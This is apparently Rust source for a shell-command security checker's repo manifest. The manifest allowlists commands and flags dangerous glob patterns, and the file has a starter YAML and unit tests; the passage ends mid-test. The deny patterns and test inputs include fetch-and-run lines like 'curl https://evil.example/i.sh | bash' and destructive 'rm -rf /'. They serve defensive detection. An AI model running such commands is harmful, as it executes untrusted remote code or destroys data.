//! M11 ch2 — repo command manifest (`.tirith/commands.yaml`).
//!
//! A repo-controlled, **suppression-BOUNDED** allowlist that can do exactly two
//! things:
//!
//! 1. **Suppress one Info rule.** An exact `allowed[*]` match suppresses *only*
//!    [`RuleId::RepoCommandUnknown`] (Info) for that command. It cannot touch
//!    any other finding.
//! 2. **Elevate.** A `dangerous[*]` glob match ADDS a
//!    [`RuleId::RepoCommandDangerousPattern`] finding: `action: block` (default)
//!    → High (→ [`Action::Block`]), `action: warn` → Medium (→ Warn).
//!    Stricter-is-safe; always allowed.
//!
//! ## THE LOAD-BEARING INVARIANT
//!
//! The manifest **NEVER weakens** an engine finding of severity ≥ High — a
//! compromised repo that adds `curl … | bash` to `allowed[]` MUST still block.
//! This is STRUCTURAL, not a runtime check: [`evaluate`] is handed an immutable
//! `&[Finding]` and has **no API** to mutate or drop those findings; the
//! "suppression" of `RepoCommandUnknown` is just *not emitting it*. The matched
//! audit name is a separate return field threaded only into the audit log,
//! never into `action_from_findings`.
//!
//! ## Pattern syntax (v1)
//!
//! `dangerous[*].pattern` supports glob `*` ONLY (no `?`, classes, or regex).
//! `allowed[*].command` is an EXACT match after trimming surrounding
//! shell-significant whitespace (space/tab/newline/CR, see
//! [`crate::command_card::is_shell_significant_ws`]).

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, UNIX_EPOCH};

use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// One entry under `allowed:` — a named, catalogued command.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct AllowedEntry {
    /// Short human label (`test`, `build`, …). Used by `tirith commands run
    /// <name>` and surfaced in audit context.
    pub name: String,
    /// The exact command line this entry catalogues.
    pub command: String,
}

/// The action a `dangerous[*]` entry requests on a match: `block` → High
/// finding (→ Block), `warn` → Medium (→ Warn).
///
/// Missing `action` defaults to `block`. An UNKNOWN value is REJECTED at
/// deserialize time (no catch-all arm) — a typo fails the load rather than
/// silently downgrading to a no-op. Both arms ELEVATE; neither can weaken.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "snake_case")]
pub enum DangerousAction {
    #[default]
    Block,
    Warn,
}

impl DangerousAction {
    /// The finding severity this action maps to. High → Block action; Medium →
    /// Warn action (see [`crate::verdict::action_from_findings`]).
    fn severity(self) -> Severity {
        match self {
            DangerousAction::Block => Severity::High,
            DangerousAction::Warn => Severity::Medium,
        }
    }
}

/// One entry under `dangerous:` — a glob pattern that, when matched, elevates
/// the verdict.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct DangerousEntry {
    /// Glob pattern (`*` wildcard only in v1).
    pub pattern: String,
    /// Action to take on a match. Defaults to `block`.
    #[serde(default)]
    pub action: DangerousAction,
}

/// Parsed `.tirith/commands.yaml`.
///
/// `deny_unknown_fields` is load-bearing: with `#[serde(default)]` on both
/// lists, a typo'd top-level key (`dangerouss:`) would otherwise load EMPTY
/// lists, silently disabling the operator's `dangerous[]` elevations. Rejecting
/// unknown keys turns that typo into a loud parse error.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct CommandsManifest {
    #[serde(default)]
    pub allowed: Vec<AllowedEntry>,
    #[serde(default)]
    pub dangerous: Vec<DangerousEntry>,
}

/// Error loading a manifest.
#[derive(Debug)]
pub enum ManifestError {
    Io(std::io::Error),
    Parse(String),
}

impl std::fmt::Display for ManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ManifestError::Io(e) => write!(f, "io error: {e}"),
            ManifestError::Parse(e) => write!(f, "yaml parse error: {e}"),
        }
    }
}

impl std::error::Error for ManifestError {}

/// The result of evaluating a command against a manifest.
///
/// SECURITY: carries findings to ADD plus an audit-only name; it holds NO handle
/// to the engine's existing findings, so the manifest cannot weaken them (see
/// the module-level invariant). Not `PartialEq`/`Eq` (`Finding` isn't `Eq`).
#[derive(Debug, Clone, Default)]
pub struct ManifestOutcome {
    /// Findings the manifest contributes: a single `RepoCommandUnknown` (Info)
    /// when uncatalogued, OR one+ `RepoCommandDangerousPattern` on a dangerous
    /// match. Never both — a dangerous match takes precedence over "unknown".
    pub findings: Vec<Finding>,
    /// The matched `allowed[*].name`, if any. AUDIT-CONTEXT ONLY — MUST NOT feed
    /// into action derivation. `None` when no allowed entry matched.
    pub matched_allowed_name: Option<String>,
}

const MANIFEST_FILENAME: &str = "commands.yaml";

/// Upper bound on bytes read from the REPO-controlled `.tirith/commands.yaml`
/// (256 KiB ≫ any genuine manifest). The read goes through
/// [`crate::util::read_regular_capped`] so a FIFO/device cannot block the open
/// and an oversized file cannot allocate unbounded — both map to a fail-safe
/// parse error (CodeRabbit R17 #1, read-guard class).
const MANIFEST_READ_CAP: u64 = 256 * 1024;

impl CommandsManifest {
    /// Parse a manifest from YAML text.
    ///
    /// Rejects DUPLICATE `allowed[].name` (CodeRabbit R11 #5): first-match
    /// lookups make a shared name order-dependent and ambiguous. Duplicate
    /// `dangerous[].pattern` is rejected too — pure redundancy, almost always a
    /// copy-paste mistake.
    pub fn from_yaml(text: &str) -> Result<Self, ManifestError> {
        let manifest: Self =
            serde_yaml::from_str(text).map_err(|e| ManifestError::Parse(e.to_string()))?;
        manifest.validate_no_duplicates()?;
        Ok(manifest)
    }

    /// Error on duplicate `allowed[].name` or `dangerous[].pattern`. Dedup uses
    /// the same `trim_shell_ws` key the matchers compare with, so two entries
    /// differing ONLY by surrounding shell-significant whitespace are rejected as
    /// the duplicates they effectively are at match time.
    fn validate_no_duplicates(&self) -> Result<(), ManifestError> {
        let mut seen_names = std::collections::HashSet::with_capacity(self.allowed.len());
        for entry in &self.allowed {
            if !seen_names.insert(trim_shell_ws(&entry.name)) {
                return Err(ManifestError::Parse(format!(
                    "duplicate allowed[].name {:?}: each catalogued command name must be unique \
                     (first-match lookup makes a duplicate name ambiguous)",
                    entry.name
                )));
            }
        }
        let mut seen_patterns = std::collections::HashSet::with_capacity(self.dangerous.len());
        for entry in &self.dangerous {
            if !seen_patterns.insert(trim_shell_ws(&entry.pattern)) {
                return Err(ManifestError::Parse(format!(
                    "duplicate dangerous[].pattern {:?}: a dangerous pattern is redundant if \
                     listed twice",
                    entry.pattern
                )));
            }
        }
        Ok(())
    }

    /// Load the manifest from a specific file path.
    ///
    /// HARDENED READ (CodeRabbit R17 #1): the REPO-controlled path is read on the
    /// exec hot path, so it routes through [`crate::util::read_regular_capped`]
    /// (`O_NONBLOCK`, fstat, capped at [`MANIFEST_READ_CAP`]) instead of a plain
    /// `read_to_string` that could block on a FIFO or allocate unbounded. A
    /// non-regular/oversized/non-UTF-8 file maps to a fail-SAFE
    /// [`ManifestError::Parse`] (the caller treats any error as "no manifest").
    pub fn load_from_path(path: &Path) -> Result<Self, ManifestError> {
        let bytes = match crate::util::read_regular_capped(path, MANIFEST_READ_CAP) {
            Ok(b) => b,
            Err(crate::util::OpenRegularError::NotFound) => {
                return Err(ManifestError::Io(std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    format!("{}: no such manifest file", path.display()),
                )))
            }
            Err(crate::util::OpenRegularError::Io(e)) => return Err(ManifestError::Io(e)),
            Err(crate::util::OpenRegularError::NotRegularFile) => {
                return Err(ManifestError::Parse(format!(
                    "{} is not a regular file (refusing a FIFO/device/socket)",
                    path.display()
                )))
            }
            Err(crate::util::OpenRegularError::TooLarge) => {
                return Err(ManifestError::Parse(format!(
                    "{} exceeds the {MANIFEST_READ_CAP}-byte manifest read cap",
                    path.display()
                )))
            }
        };
        let text = String::from_utf8(bytes)
            .map_err(|e| ManifestError::Parse(format!("manifest is not valid UTF-8: {e}")))?;
        Self::from_yaml(&text)
    }

    /// Cheap existence probe for the tier-1 force-past gate: a single
    /// `symlink_metadata` stat per candidate. When `false` the engine never
    /// reads the manifest, so a repo without one pays nothing past the stat.
    pub fn exists_for(cwd: Option<&str>) -> bool {
        discover_manifest_path(cwd).is_some()
    }

    /// Discover and load `.tirith/commands.yaml` for the given cwd.
    ///
    /// Resolution mirrors [`crate::policy::discover_local_policy_path`]:
    /// `TIRITH_POLICY_ROOT/.tirith/commands.yaml` → walk up from `cwd` to the
    /// `.git` boundary. `Ok(None)` when no manifest exists; `Err` only when a
    /// present file fails to read or parse.
    ///
    /// HOT PATH (every `engine::analyze`): the parse is backed by a per-process
    /// cache keyed on `(resolved_path, mtime)` with a 5s TTL, so a repeated check
    /// re-parses at most once per 5s (and immediately on mtime change). Path
    /// resolution still runs each call (cheap, cwd-dependent, intentionally
    /// uncached).
    pub fn discover(cwd: Option<&str>) -> Result<Option<Self>, ManifestError> {
        match discover_manifest_path(cwd) {
            Some(path) => cached_load(&path).map(Some),
            None => Ok(None),
        }
    }

    /// True when `command` exactly matches an `allowed[*].command` after trimming
    /// surrounding shell-significant whitespace on both sides. Returns the
    /// matching entry's `name` for audit context.
    ///
    /// The `trim_shell_ws` trim (CodeRabbit R9 #A) MUST stay in lockstep with the
    /// [`crate::command_card::Card::command_matches`] gate: `str::trim` would
    /// strip the full Unicode `White_Space` set (e.g. U+00A0) and disagree with
    /// the card gate. Both comparators must agree on which bytes are whitespace.
    pub fn match_allowed(&self, command: &str) -> Option<&str> {
        let needle = trim_shell_ws(command);
        self.allowed
            .iter()
            .find(|e| trim_shell_ws(&e.command) == needle)
            .map(|e| e.name.as_str())
    }

    /// All `dangerous[*]` entries whose glob pattern matches `command`. Trims
    /// shell-significant whitespace on both sides — see [`Self::match_allowed`].
    pub fn match_dangerous(&self, command: &str) -> Vec<&DangerousEntry> {
        let needle = trim_shell_ws(command);
        self.dangerous
            .iter()
            .filter(|e| glob_match(trim_shell_ws(&e.pattern), needle))
            .collect()
    }

    /// Evaluate `command` against this manifest. Rules:
    /// - A `dangerous[*]` match ADDS a `RepoCommandDangerousPattern` finding and
    ///   is the whole contribution (no `RepoCommandUnknown`).
    /// - Else if NOT in `allowed[*]`, ADD an Info `RepoCommandUnknown`.
    /// - Else (in `allowed[*]`, no dangerous match), contribute NOTHING but
    ///   record the matched name. This is the sole suppression.
    ///
    /// `_engine_findings` is taken as an immutable slice but DELIBERATELY NOT
    /// READ (the `_` binding): with no mutation/return path, the "manifest cannot
    /// weaken an engine finding" invariant is STRUCTURAL — there is no API to
    /// touch an existing finding.
    pub fn evaluate(&self, command: &str, _engine_findings: &[Finding]) -> ManifestOutcome {
        let matched_allowed_name = self.match_allowed(command).map(str::to_string);

        let dangerous = self.match_dangerous(command);
        if !dangerous.is_empty() {
            // Elevation path: dangerous wins even if also in `allowed` — you
            // cannot allow-list your way out of a dangerous pattern.
            let findings = dangerous
                .iter()
                .map(|e| dangerous_finding(&e.pattern, command, e.action))
                .collect();
            return ManifestOutcome {
                findings,
                matched_allowed_name,
            };
        }

        if matched_allowed_name.is_some() {
            // Suppression path: catalogued — suppress `RepoCommandUnknown` by not
            // emitting it; contribute nothing else.
            ManifestOutcome {
                findings: Vec::new(),
                matched_allowed_name,
            }
        } else {
            // Annotation path: not catalogued — emit the Info note (never raises
            // or lowers the action).
            ManifestOutcome {
                findings: vec![unknown_finding(command)],
                matched_allowed_name: None,
            }
        }
    }
}

/// Build the Info `RepoCommandUnknown` finding for an uncatalogued command.
fn unknown_finding(command: &str) -> Finding {
    Finding {
        rule_id: RuleId::RepoCommandUnknown,
        severity: Severity::Info,
        title: "Command not in repo command manifest".to_string(),
        description: "The command is not listed under `allowed[]` in this repo's \
             `.tirith/commands.yaml`. This is informational only and does not \
             change the verdict; add it with `tirith commands init` / by hand \
             if it is an expected repo command."
            .to_string(),
        evidence: vec![Evidence::CommandPattern {
            pattern: "allowed[*].command (exact match)".to_string(),
            // R12 #G: trim with `trim_shell_ws` (not `str::trim`) so the evidence
            // reflects exactly the bytes the matcher saw.
            matched: trim_shell_ws(command).to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Build the Info finding surfaced when a `.tirith/commands.yaml` is PRESENT but
/// could not be loaded (malformed YAML, non-regular file, oversized, etc.).
///
/// Reuses [`RuleId::RepoCommandUnknown`] (Info) — the verdict-level state is the
/// same "not catalogued", except the operator is told WHY. Info-only: never
/// raises the action, never weakens an engine finding. `reason` is the
/// [`ManifestError`] `Display` string.
pub(crate) fn unloadable_finding(reason: &str) -> Finding {
    Finding {
        rule_id: RuleId::RepoCommandUnknown,
        severity: Severity::Info,
        title: "Repo command manifest present but could not be loaded".to_string(),
        description: format!(
            "This repo's `.tirith/commands.yaml` exists but could not be loaded \
             ({reason}); its `allowed[]`/`dangerous[]` rules are NOT being \
             applied. This is informational only and does not change the verdict. \
             Fix the manifest (or remove it) so its rules take effect."
        ),
        evidence: vec![Evidence::CommandPattern {
            pattern: ".tirith/commands.yaml (load failed)".to_string(),
            matched: reason.to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Build the `RepoCommandDangerousPattern` finding for a dangerous match. The
/// entry's `action` selects the severity: `block` → High (→ Block action),
/// `warn` → Medium (→ Warn action). Both ELEVATE; neither weakens an existing
/// engine finding.
fn dangerous_finding(pattern: &str, command: &str, action: DangerousAction) -> Finding {
    let severity = action.severity();
    let action_word = match action {
        DangerousAction::Block => "block",
        DangerousAction::Warn => "warn on",
    };
    Finding {
        rule_id: RuleId::RepoCommandDangerousPattern,
        severity,
        title: "Command matches a repo-flagged dangerous pattern".to_string(),
        description: format!(
            "The command matches the dangerous pattern '{}' declared under \
             `dangerous[]` in this repo's `.tirith/commands.yaml`. The repo has \
             explicitly flagged this shape to {action_word}.",
            trim_shell_ws(pattern)
        ),
        // R12 #G: trim with `trim_shell_ws` so the evidence reflects exactly what
        // the matcher compared.
        evidence: vec![Evidence::CommandPattern {
            pattern: trim_shell_ws(pattern).to_string(),
            matched: trim_shell_ws(command).to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

// ---- Hot-path parse cache -------------------------------------------------

/// Per-process cache of a parsed manifest, keyed on the resolved PATH (not
/// `cwd`): load once, 5s TTL, re-parse on mtime change.
struct CacheState {
    path: PathBuf,
    manifest: CommandsManifest,
    loaded_at: Instant,
    mtime_nanos: u128,
}

static CACHE: Mutex<Option<CacheState>> = Mutex::new(None);

const CACHE_TTL: Duration = Duration::from_secs(5);

fn manifest_mtime_nanos(path: &Path) -> u128 {
    std::fs::metadata(path)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_nanos())
        .unwrap_or(0)
}

/// Load + parse the manifest at `path` through the cache. Reloads on path
/// change, TTL expiry, or mtime change. A parse/IO error is NOT cached so a
/// transient error does not stick.
fn cached_load(path: &Path) -> Result<CommandsManifest, ManifestError> {
    let cur_mtime = manifest_mtime_nanos(path);
    let now = Instant::now();
    {
        let guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(state) = guard.as_ref() {
            let fresh = state.path == path
                && now.duration_since(state.loaded_at) < CACHE_TTL
                && state.mtime_nanos == cur_mtime;
            if fresh {
                return Ok(state.manifest.clone());
            }
        }
    }

    // Miss / stale: read + parse outside the lock, then store.
    let manifest = CommandsManifest::load_from_path(path)?;
    let mut guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    *guard = Some(CacheState {
        path: path.to_path_buf(),
        manifest: manifest.clone(),
        loaded_at: now,
        mtime_nanos: cur_mtime,
    });
    Ok(manifest)
}

/// Drop the per-process manifest cache. Tests that write/edit a manifest then
/// assert via [`CommandsManifest::discover`] call this so a stale earlier load
/// is not reused.
pub fn invalidate_cache() {
    let mut guard = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    *guard = None;
}

/// Does a path ENTRY exist at `candidate`, even a symlink/directory/FIFO?
///
/// CodeRabbit R19 #1: must NOT use `Path::is_file()` — it follows symlinks and
/// coerces non-regular/error entries to `false`, so a present-but-broken
/// manifest would read as ABSENT and the discovery walk would step over it,
/// silently dropping the suppression note + dangerous-glob enforcement.
/// `symlink_metadata` instead: any extant entry STOPS the walk, leaving the
/// not-a-regular-file case to the hardened [`CommandsManifest::load_from_path`].
///
/// FAIL-SAFE (CodeRabbit R13f): only a genuine `NotFound` means absent; any
/// other stat error (`EACCES`, symlink loop, I/O fault) is treated as PRESENT so
/// discovery surfaces the unloadable manifest rather than stepping over it.
fn manifest_path_present(candidate: &Path) -> bool {
    match candidate.symlink_metadata() {
        Ok(_) => true,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
        Err(_) => true,
    }
}

/// Resolve the path of `.tirith/commands.yaml` for `cwd`, mirroring policy
/// discovery: `TIRITH_POLICY_ROOT/.tirith/commands.yaml` first, then walk up
/// from `cwd` to the `.git` boundary.
fn discover_manifest_path(cwd: Option<&str>) -> Option<PathBuf> {
    if let Ok(root) = std::env::var("TIRITH_POLICY_ROOT") {
        let candidate = PathBuf::from(&root).join(".tirith").join(MANIFEST_FILENAME);
        if manifest_path_present(&candidate) {
            return Some(candidate);
        }
    }
    let start = cwd
        .map(PathBuf::from)
        .or_else(|| std::env::current_dir().ok())?;
    let mut current = start.as_path();
    loop {
        let candidate = current.join(".tirith").join(MANIFEST_FILENAME);
        if manifest_path_present(&candidate) {
            return Some(candidate);
        }
        // `.git` may be a dir or a file (worktrees); stop at the repo boundary so
        // we never escape into a parent repo's manifest.
        if current.join(".git").exists() {
            return None;
        }
        match current.parent() {
            Some(parent) if parent != current => current = parent,
            _ => return None,
        }
    }
}

/// Resolve where `tirith commands init` should write the starter manifest for a
/// given cwd: `<repo-root>/.tirith/commands.yaml` when inside a git repo, else
/// `<cwd>/.tirith/commands.yaml`.
pub fn init_manifest_path(cwd: Option<&str>) -> Option<PathBuf> {
    let root = crate::policy::find_repo_root(cwd).or_else(|| {
        cwd.map(PathBuf::from)
            .or_else(|| std::env::current_dir().ok())
    })?;
    Some(root.join(".tirith").join(MANIFEST_FILENAME))
}

/// The starter manifest written by `tirith commands init`.
pub const STARTER_MANIFEST: &str = r#"# tirith repo command manifest (.tirith/commands.yaml)
#
# This file is SUPPRESSION-BOUNDED. It can do exactly two things:
#
#   1. `allowed[]` — an exact-match catalogue of expected repo commands.
#      Listing a command here suppresses ONLY the informational
#      `repo_command_unknown` note for that exact command. It does NOT and
#      CANNOT weaken any real finding: a command that the engine flags as
#      High/Critical (e.g. `curl ... | bash`) STILL BLOCKS even if it is
#      listed under `allowed[]`.
#
#   2. `dangerous[]` — glob patterns (only `*` is supported in v1) that, when
#      matched, ADD a `repo_command_dangerous_pattern` finding regardless of
#      what the engine found. Each entry's `action` chooses the severity:
#        - action: block  (default) -> High, BLOCKS the command.
#        - action: warn             -> Medium, WARNS (surfaced + acknowledgeable,
#                                      not blocked).
#      Either way the manifest only makes a repo STRICTER, never weaker.
#
# Run `tirith commands list` to see the catalogue, `tirith commands run <name>`
# to execute an allowed command, and `tirith commands check -- "<cmd>"` to
# evaluate an arbitrary command against this manifest + the engine.

allowed:
  - name: test
    command: npm test
  - name: build
    command: npm run build

dangerous:
  - pattern: "curl * | bash"
    action: block
"#;

/// Trim ONLY shell-significant whitespace (space/tab/newline/CR), never the full
/// Unicode `White_Space` set and never `\x0C` FORM FEED. Load-bearing (CodeRabbit
/// R9 #A, R13 #3): it MUST agree byte-for-byte with the
/// [`crate::command_card::Card::command_matches`] gate via the shared
/// `is_shell_significant_ws` predicate. Do NOT "simplify" to `str::trim` (strips
/// U+00A0 …) or `str::trim_ascii` (strips form feed) — either reintroduces a
/// match bypass.
fn trim_shell_ws(s: &str) -> &str {
    s.trim_matches(crate::command_card::is_shell_significant_ws)
}

/// Minimal glob matcher supporting only `*` (any run, incl. empty), anchored at
/// both ends. A two-pointer backtracking matcher over chars (non-ASCII safe, no
/// external dependency).
fn glob_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();

    let mut pi = 0usize;
    let mut ti = 0usize;
    let mut star_pi: Option<usize> = None;
    let mut star_ti = 0usize;

    while ti < t.len() {
        if pi < p.len() && p[pi] == '*' {
            // Record the star and try to match zero characters first.
            star_pi = Some(pi);
            star_ti = ti;
            pi += 1;
        } else if pi < p.len() && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if let Some(sp) = star_pi {
            // Mismatch: let the last '*' consume one more character.
            pi = sp + 1;
            star_ti += 1;
            ti = star_ti;
        } else {
            return false;
        }
    }

    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }

    pi == p.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest() -> CommandsManifest {
        CommandsManifest::from_yaml(STARTER_MANIFEST).expect("starter parses")
    }

    #[test]
    fn starter_manifest_parses() {
        let m = manifest();
        assert_eq!(m.allowed.len(), 2);
        assert_eq!(m.allowed[0].name, "test");
        assert_eq!(m.allowed[0].command, "npm test");
        assert_eq!(m.dangerous.len(), 1);
        assert_eq!(m.dangerous[0].pattern, "curl * | bash");
        assert_eq!(m.dangerous[0].action, DangerousAction::Block);
    }

    #[test]
    fn unknown_top_level_key_is_rejected() {
        // F2: a typo'd top-level key must FAIL the load, not silently load empty
        // lists. `deny_unknown_fields` enforces this.
        let typo = "dangerouss:\n  - pattern: \"curl * | bash\"\n";
        let err = CommandsManifest::from_yaml(typo)
            .expect_err("a misspelled top-level key must be a parse error");
        assert!(matches!(err, ManifestError::Parse(_)), "got {err:?}");

        // A correctly-spelled manifest still parses (no false positive).
        let ok = "dangerous:\n  - pattern: \"curl * | bash\"\n";
        let m = CommandsManifest::from_yaml(ok).expect("valid manifest parses");
        assert_eq!(m.dangerous.len(), 1);
    }

    #[test]
    fn duplicate_allowed_name_is_rejected() {
        // CodeRabbit R11 #5: a shared `name` makes lookups order-dependent; the
        // load must FAIL rather than silently pick the first.
        let dup = "allowed:\n  - name: build\n    command: npm run build\n  - name: build\n    command: make\n";
        let err = CommandsManifest::from_yaml(dup)
            .expect_err("a duplicate allowed[].name must be a parse error");
        match err {
            ManifestError::Parse(msg) => {
                assert!(
                    msg.contains("duplicate allowed[].name") && msg.contains("build"),
                    "error must name the duplicate, got: {msg}"
                );
            }
            other => panic!("expected Parse error, got {other:?}"),
        }
        // Distinct names still parse (no false positive).
        let ok = "allowed:\n  - name: build\n    command: npm run build\n  - name: test\n    command: npm test\n";
        let m = CommandsManifest::from_yaml(ok).expect("distinct names parse");
        assert_eq!(m.allowed.len(), 2);
    }

    #[test]
    fn duplicate_names_differing_only_by_shell_whitespace_are_rejected() {
        // CodeRabbit R20: `"build"` and `"build "` trim equal at match time, so
        // dedup must reject them as duplicates.
        let dup =
            "allowed:\n  - name: \"build\"\n    command: a\n  - name: \"build \"\n    command: b\n";
        let err = CommandsManifest::from_yaml(dup).expect_err(
            "names differing only by trailing shell-significant whitespace must be duplicates",
        );
        assert!(matches!(err, ManifestError::Parse(_)));
        // Same for dangerous[].pattern.
        let dup_pat =
            "dangerous:\n  - pattern: \"rm -rf *\"\n  - pattern: \" rm -rf *\"\n    action: warn\n";
        assert!(CommandsManifest::from_yaml(dup_pat).is_err());
    }

    #[test]
    fn duplicate_dangerous_pattern_is_rejected() {
        // CodeRabbit R11 #5: a duplicated dangerous glob is pure redundancy — reject at load.
        let dup = "dangerous:\n  - pattern: \"curl * | bash\"\n  - pattern: \"curl * | bash\"\n    action: warn\n";
        let err = CommandsManifest::from_yaml(dup)
            .expect_err("a duplicate dangerous[].pattern must be a parse error");
        assert!(
            matches!(&err, ManifestError::Parse(msg) if msg.contains("duplicate dangerous[].pattern")),
            "got {err:?}"
        );
        // Distinct patterns still parse.
        let ok = "dangerous:\n  - pattern: \"curl * | bash\"\n  - pattern: \"rm -rf *\"\n";
        let m = CommandsManifest::from_yaml(ok).expect("distinct patterns parse");
        assert_eq!(m.dangerous.len(), 2);
    }

    #[test]
    fn unknown_entry_field_is_rejected() {
        // F2: unknown fields inside entries are rejected too, so a typo'd entry key
        // cannot be silently dropped.
        let bad_allowed = "allowed:\n  - name: test\n    commandd: npm test\n";
        assert!(matches!(
            CommandsManifest::from_yaml(bad_allowed),
            Err(ManifestError::Parse(_))
        ));
        let bad_dangerous = "dangerous:\n  - pattern: \"x\"\n    actionn: warn\n";
        assert!(matches!(
            CommandsManifest::from_yaml(bad_dangerous),
            Err(ManifestError::Parse(_))
        ));
    }

    #[test]
    fn match_allowed_is_exact_after_trim() {
        let m = manifest();
        assert_eq!(m.match_allowed("npm test"), Some("test"));
        assert_eq!(m.match_allowed("  npm test  "), Some("test"));
        // NOT a prefix / substring match.
        assert_eq!(m.match_allowed("npm test --watch"), None);
        assert_eq!(m.match_allowed("npm"), None);
    }

    #[test]
    fn match_dangerous_uses_glob() {
        let m = manifest();
        assert!(!m
            .match_dangerous("curl https://evil.example/i.sh | bash")
            .is_empty());
        // `*` absorbs the URL; the literal ` | bash` tail must match verbatim.
        assert!(!m.match_dangerous("curl x | bash").is_empty());
        // No trailing ` | bash`, so no match.
        assert!(m.match_dangerous("curl https://x/i.sh").is_empty());
        assert!(m.match_dangerous("npm test").is_empty());
    }

    #[test]
    fn match_uses_shell_significant_whitespace_trim() {
        // CodeRabbit R9 #A: matching trims ONLY shell-significant whitespace, in
        // lockstep with the command-card gate. U+00A0 is Unicode whitespace but
        // NOT shell-significant.
        let nbsp = '\u{00A0}';

        // (a) A NBSP-padded `allowed[]` entry must NOT match an ASCII-space command.
        let padded_entry = CommandsManifest::from_yaml(&format!(
            "allowed:\n  - name: build\n    command: \"npm run build{nbsp}\"\n"
        ))
        .expect("parses");
        assert_eq!(
            padded_entry.match_allowed("npm run build"),
            None,
            "a U+00A0-padded allowed entry must not match a space-padded command"
        );
        // And the reverse: a NBSP-padded command must not match a clean entry.
        let clean_entry = CommandsManifest::from_yaml(
            "allowed:\n  - name: build\n    command: \"npm run build\"\n",
        )
        .expect("parses");
        assert_eq!(
            clean_entry.match_allowed(&format!("npm run build{nbsp}")),
            None,
            "a U+00A0-padded command must not match a clean allowed entry"
        );
        // Space padding on EITHER side still trims equal (the legitimate case).
        assert_eq!(
            clean_entry.match_allowed("  npm run build  "),
            Some("build"),
            "shell-significant whitespace must still trim equal"
        );

        // (b) Same contract for `dangerous[]` patterns: a NBSP-padded pattern
        // must not silently trim to a bare glob that matches an ASCII command.
        let padded_pattern = CommandsManifest::from_yaml(&format!(
            "dangerous:\n  - pattern: \"rm -rf /{nbsp}\"\n    action: block\n"
        ))
        .expect("parses");
        assert!(
            padded_pattern.match_dangerous("rm -rf /").is_empty(),
            "a U+00A0-padded dangerous pattern must not match a space-padded command"
        );
        // The same pattern WITHOUT the NBSP matches (proves the padding is the
        // sole reason for the miss above, not an unrelated glob failure).
        let clean_pattern = CommandsManifest::from_yaml(
            "dangerous:\n  - pattern: \"rm -rf /\"\n    action: block\n",
        )
        .expect("parses");
        assert!(
            !clean_pattern.match_dangerous("rm -rf /").is_empty(),
            "the equivalent un-padded pattern must still match"
        );
    }

    #[test]
    fn glob_match_semantics() {
        assert!(glob_match("*", ""));
        assert!(glob_match("*", "anything at all"));
        assert!(glob_match("curl * | bash", "curl x | bash"));
        assert!(glob_match("curl * | bash", "curl  | bash"));
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(glob_match("abc", "abc"));
        assert!(!glob_match("abc", "abcd"));
        assert!(!glob_match("a*c", "ab"));
        // Anchored: a leading literal must match from the start.
        assert!(!glob_match("bash", "curl | bash"));
        // Non-ASCII safe.
        assert!(glob_match("п*т", "привет"));
    }

    #[test]
    fn evaluate_uncatalogued_emits_unknown_info() {
        let m = manifest();
        let out = m.evaluate("ls -la", &[]);
        assert_eq!(out.matched_allowed_name, None);
        assert_eq!(out.findings.len(), 1);
        assert_eq!(out.findings[0].rule_id, RuleId::RepoCommandUnknown);
        assert_eq!(out.findings[0].severity, Severity::Info);
    }

    #[test]
    fn evaluate_allowed_suppresses_unknown() {
        let m = manifest();
        let out = m.evaluate("npm test", &[]);
        assert_eq!(out.matched_allowed_name.as_deref(), Some("test"));
        // Sole suppression: nothing emitted, and crucially no RepoCommandUnknown.
        assert!(out.findings.is_empty());
    }

    #[test]
    fn finding_evidence_uses_shell_significant_whitespace_trim() {
        // CodeRabbit R12 #G: the finding evidence `matched`/`pattern` strings must
        // be trimmed of shell-significant whitespace, in lockstep with the
        // matcher — so the reported evidence is exactly what (mis)matched. A
        // U+00A0 NO-BREAK SPACE is Unicode whitespace but NOT shell-significant
        // whitespace: it must SURVIVE in the evidence (a Unicode `str::trim`
        // would have stripped it, diverging from the matcher which kept it).
        let nbsp = '\u{a0}';

        // (a) Uncatalogued-command Info note: the command keeps its NBSP padding.
        let m = manifest();
        let padded_cmd = format!("ls -la{nbsp}");
        let out = m.evaluate(&padded_cmd, &[]);
        assert_eq!(out.findings.len(), 1);
        match &out.findings[0].evidence[0] {
            Evidence::CommandPattern { matched, .. } => {
                assert!(
                    matched.ends_with(nbsp),
                    "shell-significant-whitespace trim must preserve the trailing U+00A0 in evidence, got {matched:?}"
                );
            }
            other => panic!("expected CommandPattern evidence, got {other:?}"),
        }

        // (b) Dangerous-pattern finding: both the pattern and the matched command
        // keep their NBSP padding in the evidence.
        let dm = CommandsManifest::from_yaml(&format!(
            "dangerous:\n  - pattern: \"rm -rf *{nbsp}\"\n    action: block\n"
        ))
        .expect("parses");
        let dout = dm.evaluate(&format!("rm -rf /tmp/x{nbsp}"), &[]);
        assert_eq!(dout.findings.len(), 1);
        match &dout.findings[0].evidence[0] {
